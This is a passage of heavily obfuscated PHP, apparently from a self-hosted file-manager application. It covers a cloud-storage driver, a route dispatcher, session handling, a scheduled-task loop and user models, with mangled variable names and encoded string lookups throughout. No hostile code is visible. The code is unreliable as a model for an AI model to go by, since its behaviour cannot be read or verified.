$_SERVER[€ä¾™²]; $é˜„„ú = $°ÙííÔ; $ƒøºøâŠ = array($æ­ÅÔ‚[1687] => $æ­ÅÔ‚[1688]); $³Î¼ü»ó = $á‚Ğæ; $¨×Ç–÷“ = $this->auth->uploadToken($this->bucket, $³Î¼ü»ó, $é˜„„ú, $ƒøºøâŠ, !0); $€ß¾È‰— = empty($this->region) || $this->region == $æ­ÅÔ‚[1689] ? $æ­ÅÔ‚[12] : $æ­ÅÔ‚[476] . $this->region; $±©²ıù = http_type() . "\72\57\x2f\x75\160\x6c\x6f\x61\144{$€ß¾È‰—}\56\x71\151\x6e\151\x75\160\56\143\157\155\x2f"; return array($æ­ÅÔ‚[1690] => $¨×Ç–÷“, $æ­ÅÔ‚[1554] => $±©²ıù); } public function download($û¶­ÎÙ, $¿Î¶¦Š) { $ûÚ‰é£… = IO::getPathInner(IO::mkfile($¿Î¶¦Š)); if (!($È§ôìÌ = $this->link($û¶­ÎÙ))) { return !1; } $ÀıªÇµ = 0; $®—÷‡ß‹ = 1024 * 200; $Ëáú½ÊË = fopen($ûÚ‰é£…, $_SERVER[€ä¾™²][1691]); while (!0) { $ââèÄ–× = $this->fileSubstr($û¶­ÎÙ, $ÀıªÇµ, $®—÷‡ß‹); if ($ââèÄ–× === !1) { return !1; } fwrite($Ëáú½ÊË, $ââèÄ–×); $ÀıªÇµ += $®—÷‡ß‹; if (strlen($ââèÄ–×) < $®—÷‡ß‹) { break; } } fclose($Ëáú½ÊË); return $¿Î¶¦Š; } public function link($Œ„€«Ç¥, $ıú©Ú¢¦ = '') { if (!$this->isFile($Œ„€«Ç¥)) { return !1; } $Á‹ÌÕ = $this->getHost() . $_SERVER[€ä¾™²][8] . $this->pathEncode($Œ„€«Ç¥) . $ıú©Ú¢¦; return $this->auth->privateDownloadUrl($Á‹ÌÕ, 3600 * 12); } public function fileOut($¹º¨¼õİ, $ÌŞŒà‚ü = false, $¶”È·Ã = false, $¸ìà¬± = '') { $Ü­Ñáøá =& $_SERVER[€ä¾™²]; if ($this->isFileOutServer()) { return $this->fileOutServer($¹º¨¼õİ, $ÌŞŒà‚ü, $¶”È·Ã, $¸ìà¬±); } if (!$¶”È·Ã) { $¶”È·Ã = $this->pathThis($¹º¨¼õİ); } $ÖÏ—”· = $ÌŞŒà‚ü ? $Ü­Ñáøá[1692] . rawurlencode($¶”È·Ã) : $Ü­Ñáøá[12]; $›¿¬“» = $this->link($¹º¨¼õİ, $ÖÏ—”·); $this->fileOutLink($›¿¬“»); } public function fileOutServer($•µÎ¹…ä, $³Ûêô‘¦ = false, $€©²ÊÊ„ = false, $·–ü–½ = '') { parent::fileOut($•µÎ¹…ä, $³Ûêô‘¦, $€©²ÊÊ„, $·–ü–½); } public function fileOutImage($¡’Ä½¯ú, $œçÏû®á = 250) { if ($this->size($¡’Ä½¯ú) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¡’Ä½¯ú, $œçÏû®á); } $ç˜”­¨ = $this->link($¡’Ä½¯ú, $_SERVER[€ä¾™²][1693] . $œçÏû®á); $this->fileOutLink($ç˜”­¨); } public function fileOutImageServer($µÏ§†éü, $® €‚Š = 250) { parent::fileOutImage($µÏ§†éü, $® €‚Š); } public function hashMd5($ŒàÉ˜ßù) { $ù Ó˜”– =& $_SERVER[€ä¾™²]; $È˜¶¨å÷ = $this->objectMeta($ŒàÉ˜ßù); return isset($È˜¶¨å÷[$ù Ó˜”–[246]]) ? $È˜¶¨å÷[$ù Ó˜”–[246]] : !1; $Š±µë°ß = $this->link($ŒàÉ˜ßù, $ù Ó˜”–[1694]); } public function size($äæ¾Ø¯Û) { $·•²çĞÃ = $this->objectMeta($äæ¾Ø¯Û); return $·•²çĞÃ ? $·•²çĞÃ[$_SERVER[€ä¾™²][79]] : 0; } public function info($ èéµ´) { if ($this->isFolder($ èéµ´)) { return $this->folderInfo($ èéµ´); } else { if ($this->isFile($ èéµ´)) { return $this->fileInfo($ èéµ´); } } return !1; } public function exist($¶ê¿åûÏ) { return $this->isFile($¶ê¿åûÏ) || $this->isFolder($¶ê¿åûÏ); } public function isFile($ËöÅ¼) { return !$this->isFolder($ËöÅ¼) && $this->objectMeta($ËöÅ¼); } public function isFolder($šâø’‘Ø) { return $this->cacheMethod($_SERVER[€ä¾™²][178], $šâø’‘Ø); } protected function objectMeta($ˆ¥–áÔ) { return $this->cacheMethod($_SERVER[€ä¾™²][180], $ˆ¥–áÔ); } protected function _objectMeta($Ÿš—†¢ß) { $âÖÅ­ã =& $_SERVER[€ä¾™²]; list($å¦ü–ôô, $¤ÉìÔû) = $this->bucketManager->stat($this->bucket, $Ÿš—†¢ß); if ($å¦ü–ôô) { $å¦ü–ôô[$âÖÅ­ã[79]] = intval($å¦ü–ôô[$âÖÅ­ã[1682]]); } return $å¦ü–ôô; } protected function _isFolder($ŸÇÖİÈ) { $Ÿ¬Ó¶Â› =& $_SERVER[€ä¾™²]; if ($ŸÇÖİÈ == $Ÿ¬Ó¶Â›[12] || $ŸÇÖİÈ == $Ÿ¬Ó¶Â›[8]) { return !0; } list($³ˆ¡›´×, $‘¥ß¤²â) = $this->bucketManager->listFiles($this->bucket, trim($ŸÇÖİÈ, $Ÿ¬Ó¶Â›[8]) . $Ÿ¬Ó¶Â›[8], $Ÿ¬Ó¶Â›[12], 1, $Ÿ¬Ó¶Â›[8]); return !empty($³ˆ¡›´×[$Ÿ¬Ó¶Â›[1685]]) || !empty($³ˆ¡›´×[$Ÿ¬Ó¶Â›[1686]]) ? !0 : !1; } } goto FîÊ¶Úéé; F¶Ö’ĞâŸÉ: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\156\171" => "\x5b\136\x2f\x5d\53", "\72\156\x75\155" => "\133\60\55\71\135\53", "\x3a\141\154\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($À»±¾Ç×, $Ğ­ß·š) { $§ÁŞ†Õ =& $_SERVER[€ä¾™²]; if ($À»±¾Ç× == $§ÁŞ†Õ[1858]) { $¡¬ù ¹‰ = array_map($§ÁŞ†Õ[1859], $Ğ­ß·š[0]); $çõğ§ƒ¢ = strpos($Ğ­ß·š[1], $§ÁŞ†Õ[8]) === 0 ? $Ğ­ß·š[1] : $§ÁŞ†Õ[8] . $Ğ­ß·š[1]; $¸†ÉğŞÁ = $Ğ­ß·š[2]; } else { $¡¬ù ¹‰ = null; $çõğ§ƒ¢ = strpos($Ğ­ß·š[0], $§ÁŞ†Õ[8]) === 0 ? $Ğ­ß·š[0] : $§ÁŞ†Õ[8] . $Ğ­ß·š[0]; $¸†ÉğŞÁ = $Ğ­ß·š[1]; } array_push(self::$maps, $¡¬ù ¹‰); array_push(self::$routes, $çõğ§ƒ¢); array_push(self::$methods, strtoupper($À»±¾Ç×)); array_push(self::$callbacks, $¸†ÉğŞÁ); } public static function error($®–à×ßˆ) { self::$errorCallback = $®–à×ßˆ; } public static function haltOnMatch($êÍ‹ıŸ€ = true) { self::$halts = $êÍ‹ıŸ€; } public static function dispatch() { $û½£Ò÷ =& $_SERVER[€ä¾™²]; $Ôö”ğ­… = parse_url($_SERVER[$û½£Ò÷[1860]], PHP_URL_PATH); $Å ÙÏ = $_SERVER[$û½£Ò÷[162]]; $¹˜Êıá® = array_keys(static::$patterns); $®ıŒŒƒ = array_values(static::$patterns); $Æê¥…åà = !1; self::$routes = preg_replace($û½£Ò÷[1412], $û½£Ò÷[8], self::$routes); if (in_array($Ôö”ğ­…, self::$routes)) { $¯Í«Çîş = array_keys(self::$routes, $Ôö”ğ­…); foreach ($¯Í«Çîş as $”­ˆ¤©Ä) { if (self::$methods[$”­ˆ¤©Ä] == $Å ÙÏ || self::$methods[$”­ˆ¤©Ä] == $û½£Ò÷[1861] || in_array($Å ÙÏ, self::$maps[$”­ˆ¤©Ä])) { $Æê¥…åà = !0; if (!is_object(self::$callbacks[$”­ˆ¤©Ä])) { $Ú¾™Ñ–¥ = explode($û½£Ò÷[8], self::$callbacks[$”­ˆ¤©Ä]); $ş­×¾†æ = end($Ú¾™Ñ–¥); $ºÍ­ô = explode($û½£Ò÷[1342], $ş­×¾†æ); $–š¬å¯Î = new $ºÍ­ô[0](); $–š¬å¯Î->{$ºÍ­ô[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$”­ˆ¤©Ä]); if (self::$halts) { return; } } } } } else { $¯»ÊğæË = 0; foreach (self::$routes as $”­ˆ¤©Ä) { if (strpos($”­ˆ¤©Ä, $û½£Ò÷[4]) !== !1) { $”­ˆ¤©Ä = str_replace($¹˜Êıá®, $®ıŒŒƒ, $”­ˆ¤©Ä); } if (preg_match($û½£Ò÷[1862] . $”­ˆ¤©Ä . $û½£Ò÷[1863], $Ôö”ğ­…, $âëœëì³)) { if (self::$methods[$¯»ÊğæË] == $Å ÙÏ || self::$methods[$¯»ÊğæË] == $û½£Ò÷[1861] || !empty(self::$maps[$¯»ÊğæË]) && in_array($Å ÙÏ, self::$maps[$¯»ÊğæË])) { $Æê¥…åà = !0; array_shift($âëœëì³); if (!is_object(self::$callbacks[$¯»ÊğæË])) { $Ú¾™Ñ–¥ = explode($û½£Ò÷[8], self::$callbacks[$¯»ÊğæË]); $ş­×¾†æ = end($Ú¾™Ñ–¥); $ºÍ­ô = explode($û½£Ò÷[1342], $ş­×¾†æ); $–š¬å¯Î = new $ºÍ­ô[0](); if (!method_exists($–š¬å¯Î, $ºÍ­ô[1])) { echo $û½£Ò÷[1864]; } else { call_user_func_array(array($–š¬å¯Î, $ºÍ­ô[1]), $âëœëì³); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$¯»ÊğæË], $âëœëì³); if (self::$halts) { return; } } } } $¯»ÊğæË++; } } if ($Æê¥…åà == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ó†ºÚ˜¼ =& $_SERVER[€ä¾™²]; header($_SERVER[$ó†ºÚ˜¼[1865]] . $ó†ºÚ˜¼[1866]); echo $ó†ºÚ˜¼[1867]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$û½£Ò÷[1860]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ú¡ê£ùô =& $_SERVER[€ä¾™²]; static $³…—ÔÎË = false; if ($³…—ÔÎË) { return $³…—ÔÎË; } $İ …æ¿¯ = $GLOBALS[$ú¡ê£ùô[6]][$ú¡ê£ùô[425]]; self::$sessionTime = $İ …æ¿¯[$ú¡ê£ùô[1868]]; $òˆêŞèÜ = isset($GLOBALS[$ú¡ê£ùô[1869]]) ? $GLOBALS[$ú¡ê£ùô[1869]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($òˆêŞèÜ)) { self::$sessionSign = Cookie::get($òˆêŞèÜ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($òˆêŞèÜ, self::$sessionSign, self::$sessionTime); $öË£¢Õ = $İ …æ¿¯[$ú¡ê£ùô[1870]]; $Ü¾Çë’¡ = $İ …æ¿¯[$öË£¢Õ]; $øàØäÁ = $İ …æ¿¯[$ú¡ê£ùô[935]]; switch ($öË£¢Õ) { case $ú¡ê£ùô[21]: self::$handle = Model($ú¡ê£ùô[936]); break; case $ú¡ê£ùô[937]: self::$handle = new CacheRedis($Ü¾Çë’¡, $øàØäÁ); break; case $ú¡ê£ùô[938]: self::$handle = new CacheMemcached($Ü¾Çë’¡, $øàØäÁ); break; case $ú¡ê£ùô[231]: $Ü¾Çë’¡[$ú¡ê£ùô[87]] = $Ü¾Çë’¡[$ú¡ê£ùô[87]] . $ú¡ê£ùô[1871]; self::$handle = new CacheFile($Ü¾Çë’¡, $øàØäÁ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); if (!self::$data || !isset(self::$data[$ú¡ê£ùô[1608]]) || time() - self::$data[$ú¡ê£ùô[1608]] >= 5) { self::dataSave(); } } $³…—ÔÎË = new self(); return $³…—ÔÎË; } public static function getBySign($›¹•û¢§) { $È™ÌÏ÷Ş = self::$handle->get($›¹•û¢§); $È™ÌÏ÷Ş = unserialize($È™ÌÏ÷Ş); return is_array($È™ÌÏ÷Ş) ? $È™ÌÏ÷Ş : array(); } public static function setBySign($õöó¾‹ô, $—›²†ğ) { self::$sessionSign = $õöó¾‹ô; self::$data = $—›²†ğ; self::dataSave(); } private static function dataSave() { CacheLock::lock(self::$sessionSign); if (!self::$data || !is_array(self::$data)) { self::$data = array(); } self::$data[$_SERVER[€ä¾™²][1608]] = time(); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function sign($ì³ÀÆÌ  = false) { if ($ì³ÀÆÌ ) { self::$sessionSign = $ì³ÀÆÌ ; } self::init(); return self::$sessionSign; } public static function set($ÕÖµúú¬, $úê‹ê¡ = false) { self::init(); if (is_array($ÕÖµúú¬)) { foreach ($ÕÖµúú¬ as $ ¤Íƒúï => $†ÀÓºÊ¾) { array_set_value(self::$data, $ ¤Íƒúï, $†ÀÓºÊ¾); } } else { array_set_value(self::$data, $ÕÖµúú¬, $úê‹ê¡); } self::dataSave(); } public static function get($îö­•ˆ = false) { self::init(); if (!$îö­•ˆ) { return self::$data; } return array_get_value(self::$data, $îö­•ˆ); } public static function remove($Øª ªÊ) { self::init(); unset(self::$data[$Øª ªÊ]); self::dataSave(); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[€ä¾™²][944])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $¦•Ï¢”î =& $_SERVER[€ä¾™²]; if (self::valueGet($¦•Ï¢”î[850]) != $¦•Ï¢”î[91]) { return; } if (self::valueGet($¦•Ï¢”î[1872]) == $¦•Ï¢”î[91]) { $³¡‘Ä™Î = self::valueGet($¦•Ï¢”î[1873]); if (time() - $³¡‘Ä™Î > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($¦•Ï¢”î[1872], $¦•Ï¢”î[91]); self::log($¦•Ï¢”î[1874] . ACTION . $¦•Ï¢”î[1875]); Hook::bind($¦•Ï¢”î[1876], $¦•Ï¢”î[1877]); $Ğºû½Í… = 0; while (!0) { self::cacheClear(); if (self::valueGet($¦•Ï¢”î[850]) != $¦•Ï¢”î[91]) { self::valueSet($¦•Ï¢”î[1872], $¦•Ï¢”î[229]); self::log($¦•Ï¢”î[1878]); die; } $ëÕ©œÙÆ = time(); if ($ëÕ©œÙÆ - $Ğºû½Í… >= 60) { self::valueSet(array($¦•Ï¢”î[1872] => $¦•Ï¢”î[91], $¦•Ï¢”î[1873] => $ëÕ©œÙÆ)); $Ğºû½Í… = $ëÕ©œÙÆ; } if (!file_exists(USER_SYSTEM . $¦•Ï¢”î[1879])) { self::valueSet(array($¦•Ï¢”î[1872] => $¦•Ï¢”î[229], $¦•Ï¢”î[850] => $¦•Ï¢”î[229])); self::log($¦•Ï¢”î[1880]); die; } $ŒÎş³È¥ = file_get_contents(BASIC_PATH . $¦•Ï¢”î[1881]); $Õé™õ¿ß = KOD_VERSION . $¦•Ï¢”î[10] . KOD_VERSION_BUILD; $Ç­ÎÙ = match_text($ŒÎş³È¥, $¦•Ï¢”î[1882]) . $¦•Ï¢”î[10] . match_text($ŒÎş³È¥, $¦•Ï¢”î[1883]); if ($Ç­ÎÙ != $Õé™õ¿ß) { self::restart(); self::log("\163\164\x6f\160\145\x64\x2e\x5b\x76\145\162\163\x69\x6f\156\x20\x75\x70\144\141\164\x65\x3b{$versionNow}\40\x3d\76\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $Æ¬ù£åè =& $_SERVER[€ä¾™²]; http_close(); $GLOBALS[$Æ¬ù£åè[1884]] = 1; $_SERVER[$Æ¬ù£åè[1885]] = $Æ¬ù£åè[1886]; $_COOKIE = array(); $GLOBALS[$Æ¬ù£åè[1887]] = 1; $GLOBALS[$Æ¬ù£åè[1888]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $éã¡ó =& $_SERVER[€ä¾™²]; http_close(); self::valueSet($éã¡ó[850], $éã¡ó[229]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($éã¡ó[1872] => $éã¡ó[229], $éã¡ó[850] => $éã¡ó[91])); self::log($éã¡ó[1889]); } public static function taskSwitch() { $Œ’ßİŠ“ =& $_SERVER[€ä¾™²]; $—´æÄÀ‰ = self::valueGet($Œ’ßİŠ“[850]) == $Œ’ßİŠ“[91] ? $Œ’ßİŠ“[229] : $Œ’ßİŠ“[91]; self::valueSet($Œ’ßİŠ“[850], $—´æÄÀ‰); } public static function shutdownEvent() { $Å™òÌÑ½ =& $_SERVER[€ä¾™²]; self::valueSet($Å™òÌÑ½[1872], $Å™òÌÑ½[229]); self::log($Å™òÌÑ½[1890]); } public static function config($í•ÇÃ€¡, $œèÒ£óı) { self::valueSet($_SERVER[€ä¾™²][850], $í•ÇÃ€¡); } private static function taskRunAll() { $Åò´í–… =& $_SERVER[€ä¾™²]; $ù³Ÿ§›Î = timeFloat(); $—ÑŸŞïŒ = Model($Åò´í–…[1891])->listData(); $üâûŸ²£ = count($—ÑŸŞïŒ); for ($»ä¢ªí = 0; $»ä¢ªí < $üâûŸ²£; $»ä¢ªí++) { $•Ì¹ù = $—ÑŸŞïŒ[$»ä¢ªí]; if (!$•Ì¹ù[$Åò´í–…[486]] || $•Ì¹ù[$Åò´í–…[1892]] != $Åò´í–…[91]) { continue; } if (!self::taskTimeCheck($•Ì¹ù)) { continue; } self::taskRun($•Ì¹ù); } Hook::trigger($Åò´í–…[1893]); self::taskQueueRun($ù³Ÿ§›Î); } private static function taskQueueRun($ë¸ÌÀĞ¤) { $èÑêûÉë = 10; while (!0) { $Û‡©Ø¤Á = TaskQueue::run(); if ($Û‡©Ø¤Á === !1) { break; } if (timeFloat() - $ë¸ÌÀĞ¤ >= $èÑêûÉë) { break; } } } private static function taskTimeCheck($—ªÄ£) { $·ÌË¾×° =& $_SERVER[€ä¾™²]; $¿ÂË©ğÓ = json_decode($—ªÄ£[$·ÌË¾×°[205]], !0); $ÚªÈÆ› = intval($—ªÄ£[$·ÌË¾×°[1873]]); $Üä£¼† = strtotime($·ÌË¾×°[1894] . $¿ÂË©ğÓ[$·ÌË¾×°[1895]] . $·ÌË¾×°[1896]) - strtotime($·ÌË¾×°[1897]); $í—Õˆ– = time() - strtotime(date($·ÌË¾×°[1898]) . $·ÌË¾×°[1899]); $·©‘Œ³º = $í—Õˆ– >= $Üä£¼† && $í—Õˆ– <= $Üä£¼† + 3600; switch ($¿ÂË©ğÓ[$·ÌË¾×°[33]]) { case $·ÌË¾×°[1900]: if (time() - $ÚªÈÆ› < 3600 * 24 * 30) { return !1; } if ($¿ÂË©ğÓ[$·ÌË¾×°[1900]] == date($·ÌË¾×°[1901]) && $·©‘Œ³º) { return !0; } break; case $·ÌË¾×°[1902]: if (time() - $ÚªÈÆ› < 3600 * 24 * 7) { return !1; } $“ñ­™¶œ = date($·ÌË¾×°[1903]) == 0 ? 7 : date($·ÌË¾×°[1903]); if ($¿ÂË©ğÓ[$·ÌË¾×°[1902]] == $“ñ­™¶œ && $·©‘Œ³º) { return !0; } break; case $·ÌË¾×°[1895]: if (time() - $ÚªÈÆ› < 3600 * 24) { return !1; } if ($·©‘Œ³º) { return !0; } break; case $·ÌË¾×°[1904]: if (time() - $ÚªÈÆ› >= floatval($¿ÂË©ğÓ[$·ÌË¾×°[1904]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ğßñ  =& $_SERVER[€ä¾™²]; static $ÚáÙ—êÉ = 0; $„¨“òÄ = 300; if (!$ÚáÙ—êÉ) { $ÚáÙ—êÉ = time(); } if (time() - $ÚáÙ—êÉ < $„¨“òÄ) { return; } $ÚáÙ—êÉ = time(); $”‹öÅŒ± = Model($ğßñ [604])->db($ğßñ [12]); if ($”‹öÅŒ±) { $”‹öÅŒ±->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ğßñ [1905], $ğßñ [1906]); die; } } public static function taskRun($«Úğ») { $§’œíæÇ =& $_SERVER[€ä¾™²]; self::log($§’œíæÇ[1907] . $«Úğ»[$§’œíæÇ[486]] . $§’œíæÇ[1908] . $«Úğ»[$§’œíæÇ[32]] . $§’œíæÇ[1909] . $«Úğ»[$§’œíæÇ[1510]]); Model($§’œíæÇ[1891])->run($«Úğ»[$§’œíæÇ[486]]); $±Àù§±í = timeFloat(); $ÌğÁÜ¨² = $§’œíæÇ[12]; switch ($«Úğ»[$§’œíæÇ[33]]) { case $§’œíæÇ[383]: $’€¶ˆıÌ = url_request($«Úğ»[$§’œíæÇ[1510]], $§’œíæÇ[1552], !1, !1, !1, !1, 10); if ($’€¶ˆıÌ[$§’œíæÇ[850]]) { $ÌğÁÜ¨² = strlen($’€¶ˆıÌ[$§’œíæÇ[1336]]); } break; case $§’œíæÇ[1910]: $ÌğÁÜ¨² = Hook::apply($«Úğ»[$§’œíæÇ[1510]]); default: break; } Model($§’œíæÇ[1911])->add(array($§’œíæÇ[1912] => $§’œíæÇ[12], $§’œíæÇ[1913] => $§’œíæÇ[229], $§’œíæÇ[33] => $§’œíæÇ[1914] . $«Úğ»[$§’œíæÇ[486]], $§’œíæÇ[1915] => json_encode(array($§’œíæÇ[32] => $«Úğ»[$§’œíæÇ[32]], $§’œíæÇ[1916] => timeFloat() - $±Àù§±í, $§’œíæÇ[856] => $ÌğÁÜ¨²)))); $µ¯«×€« = $ÌğÁÜ¨² ? $§’œíæÇ[1917] . $ÌğÁÜ¨² : $§’œíæÇ[12]; self::log($§’œíæÇ[1918] . $«Úğ»[$§’œíæÇ[486]] . $§’œíæÇ[176] . $µ¯«×€«); return !0; } public static function valueGet($öí¶†¢€) { $Ğ¥¿ÊÚ™ =& $_SERVER[€ä¾™²]; $­Ÿ–¾áñ = $Ğ¥¿ÊÚ™[1919]; $¥ ©®Ş = Model($Ğ¥¿ÊÚ™[529])->get($öí¶†¢€, $­Ÿ–¾áñ); if (is_null($¥ ©®Ş)) { Model($Ğ¥¿ÊÚ™[529])->set($Ğ¥¿ÊÚ™[850], $Ğ¥¿ÊÚ™[91], $­Ÿ–¾áñ); Model($Ğ¥¿ÊÚ™[529])->set($Ğ¥¿ÊÚ™[1872], $Ğ¥¿ÊÚ™[229], $­Ÿ–¾áñ); $¥ ©®Ş = Model($Ğ¥¿ÊÚ™[529])->get($öí¶†¢€, $­Ÿ–¾áñ); } return $¥ ©®Ş; } private static function valueSet($›­…æÈÎ, $Ìû‰ø† = false) { $ƒÆ£ˆÈµ =& $_SERVER[€ä¾™²]; $‡¾¿Û­¨ = $ƒÆ£ˆÈµ[1920]; CacheLock::lock($‡¾¿Û­¨); $ô¦ì¶Ä = Model($ƒÆ£ˆÈµ[529])->set($›­…æÈÎ, $Ìû‰ø†, $ƒÆ£ˆÈµ[1919]); CacheLock::unlock($‡¾¿Û­¨); return $ô¦ì¶Ä; } protected static function log($Ş—‰¬è) { write_log($Ş—‰¬è, $_SERVER[€ä¾™²][1906]); } private static function cacheClear() { $Àá¾´½â =& $_SERVER[€ä¾™²]; Cache::clearMemory(Model($Àá¾´½â[529])->cacheKey($Àá¾´½â[1919])); Cache::clearMemory(Model($Àá¾´½â[529])->cacheKey($Àá¾´½â[1921])); Model($Àá¾´½â[1891])->cacheClear(); self::closeDatabase(); } } goto AˆŒ™ê÷ø¾; fóœ¥ÎÄÚ¶: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\x6a\157\x62\x4c\x69\x73\164"; public $field = array("\156\x61\x6d\145", "\x64\x65\x73\143", "\x73\x6f\x72\x74"); const JOB_KEY = "\x73\x65\x6c\146\x4a\x6f\142\x4c\151\163\164"; public function listData($ÉİÈŞ´¦ = false, $¹ï…´“ò = "\163\x6f\x72\164", $ÓúºĞö = false) { return parent::listData($ÉİÈŞ´¦, $¹ï…´“ò, $ÓúºĞö); } public function remove($ë®¨İŸ) { return parent::remove($ë®¨İŸ); } public function add($øâÌø´ò) { $¦ü÷ëî° =& $_SERVER[€ä¾™²]; if ($this->findByName($øâÌø´ò[$¦ü÷ëî°[32]])) { return !1; } $øâÌø´ò[$¦ü÷ëî°[2150]] = $this->getSort(); return parent::insert($øâÌø´ò); } private function getSort() { $°°¿½ä =& $_SERVER[€ä¾™²]; $¼—Ã‘èï = parent::listData(); $ñüÎÏ¡  = array_to_keyvalue($¼—Ã‘èï, $°°¿½ä[12], $°°¿½ä[2150]); return empty($ñüÎÏ¡ ) ? 0 : max($ñüÎÏ¡ ) + 1; } public function update($è—‡¢Íê, $ş›îÍõÒ) { $µªÕ«îÃ =& $_SERVER[€ä¾™²]; $ØŒâ¸Ó‚ = parent::listData($è—‡¢Íê); $—›¨…ÄÁ = $this->findByName($ş›îÍõÒ[$µªÕ«îÃ[32]]); if (!$ØŒâ¸Ó‚ || $—›¨…ÄÁ && $—›¨…ÄÁ[$µªÕ«îÃ[486]] != $ØŒâ¸Ó‚[$µªÕ«îÃ[486]]) { return !1; } return parent::update($è—‡¢Íê, $ş›îÍõÒ); } public function setUserJob($ÃÜÍ¯Š, $÷¨Şâ½œ) { $œÌ‹Úî• =& $_SERVER[€ä¾™²]; if (!is_array($÷¨Şâ½œ)) { $÷¨Şâ½œ = array($÷¨Şâ½œ); } $ÉÉ“ä®€ = parent::listData(); $üê“ñÓë = array_to_keyvalue($ÉÉ“ä®€, $œÌ‹Úî•[32]); $™‡èÂÁï = $œÌ‹Úî•[463]; foreach ($÷¨Şâ½œ as $Úû‡×Ñò) { if ($üê“ñÓë[$Úû‡×Ñò]) { $™‡èÂÁï .= $üê“ñÓë[$Úû‡×Ñò][$œÌ‹Úî•[486]] . $œÌ‹Úî•[50]; } else { $ŞÙÇÕÑ¹ = $this->add($Úû‡×Ñò); $™‡èÂÁï .= $ŞÙÇÕÑ¹ . $œÌ‹Úî•[50]; } } $™‡èÂÁï = rtrim($™‡èÂÁï, $œÌ‹Úî•[50]); Model($œÌ‹Úî•[624])->metaSet($ÃÜÍ¯Š, self::JOB_KEY, $™‡èÂÁï); } public function getUserJob($½ğ„Æ›±) { $‹¿‡«Ìô = Model($_SERVER[€ä¾™²][624])->metaGet($½ğ„Æ›±); return $this->getUserJobInfo($‹¿‡«Ìô[self::JOB_KEY]); } public function getUserJobInfo($ç‹åİ) { $Œ¯áÊò =& $_SERVER[€ä¾™²]; $É™ÒŠ™‡ = explode($Œ¯áÊò[50], $ç‹åİ); $Ï¡ÑÔÑ = parent::listData(); $Ï¡ÑÔÑ = array_remove_key($Ï¡ÑÔÑ, $Œ¯áÊò[232]); $Â‚¯’™Ş = array(); foreach ($É™ÒŠ™‡ as $®è­íî) { if (isset($Ï¡ÑÔÑ[$®è­íî])) { $Â‚¯’™Ş[] = $Ï¡ÑÔÑ[$®è­íî]; } } return $Â‚¯’™Ş; } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\x72"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\x61\x6d\x65" => "\x75\x73\x65\162\x5f\155\145\x74\x61", "\x6d\145\164\x61\106\151\x65\154\x64" => "\x75\x73\145\162\x49\104"); protected $simpleField = "\x75\163\145\x72\x49\x44\54\156\151\143\x6b\x4e\x61\x6d\x65\54\156\141\155\145\x2c\x61\x76\x61\164\x61\162\54\163\x65\170\x2c\163\x74\141\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($‹ Ú€¢â) { $”ÓœÁúç =& $_SERVER[€ä¾™²]; $Ê±œŸ = $”ÓœÁúç[2624]; return array($”ÓœÁúç[2207] => array($‹ Ú€¢â[0], $Ê±œŸ), $”ÓœÁúç[2209] => array($‹ Ú€¢â[0], $Ê±œŸ), $”ÓœÁúç[2625] => array($‹ Ú€¢â[0], $Ê±œŸ)); } protected function ___getInfo($×«İ·ø™) { $Öíí¨œå = $this->getInfoSimple($×«İ·ø™); if (!$Öíí¨œå || !is_array($Öíí¨œå)) { return array(); } return $this->_getInfoApply($Öíí¨œå); } protected function ___getInfoFull($…—Şíİ) { $ÀÕ“ù¡¨ = $this->getInfoSimple($…—Şíİ); if (!$ÀÕ“ù¡¨ || !is_array($ÀÕ“ù¡¨)) { return array(); } return $this->_getInfoApply($ÀÕ“ù¡¨, !0); } protected function ___getInfoSimple($Ê‚‘Ã¤Â) { $úèµ‹ç =& $_SERVER[€ä¾™²]; if (!$Ê‚‘Ã¤Â) { return array(); } $úÄª²Ø = $this->where(array($úèµ‹ç[1539] => intval($Ê‚‘Ã¤Â)))->find(); if (!$úÄª²Ø || !is_array($úÄª²Ø)) { return array(); } $úÄª²Ø[$úèµ‹ç[2319]] = Action($úèµ‹ç[2320])->parseUrl($úÄª²Ø[$úèµ‹ç[2319]]); return $úÄª²Ø; } private function _getInfoApply($‚†öò×ğ, $€šõœ­ô = false) { $ˆìëøÌê =& $_SERVER[€ä¾™²]; if (!$‚†öò×ğ) { return $‚†öò×ğ; } $»Ùöáô© = 